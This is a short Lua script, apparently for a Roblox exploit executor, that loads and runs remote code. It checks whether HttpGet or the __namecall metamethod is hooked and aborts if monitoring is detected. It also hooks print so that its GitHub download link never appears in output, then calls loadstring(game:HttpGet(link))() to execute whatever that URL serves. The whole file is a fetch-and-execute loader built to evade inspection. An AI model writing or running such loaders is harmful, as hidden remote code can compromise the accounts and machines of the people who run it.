local newcclosure = function(func)
 local loop = coroutine.wrap(function(...)
  local tabl = {coroutine.yield()}
   while true do
     tabl = {coroutine.yield(func(unpack(tabl)))}
   end
 end)
  
  loop()
  return loop
end
newcclosure = newcclosure(newcclosure)

local ishooked = newcclosure(function(func)
  if typeof(func) == "function" then
    if debug.info(func, "s") == "[C]" and debug.getinfo(func).name == "" then
      return true
    end
  end
  return false
end)

if restorefunction then
  if ishooked(getrawmetatable(game)["__namecall"]) then
    restorefunction(getrawmetatable(game)["__namecall"])
  end
end

if ishooked(game.HttpGet) or ishooked(game.HttpGetAsync) then
  return
end

local link = "https://raw.githubusercontent.com/ADSKerOffical/BHUOriginal/refs/heads/main/Support/Random%20tool"

local hook; hook = hookfunction(print, newcclosure(function(...)
  if tostring(unpack({...})):find(link) then
  return nil
      end
  return hook(...)
end))

loadstring(game:HttpGet(link))()
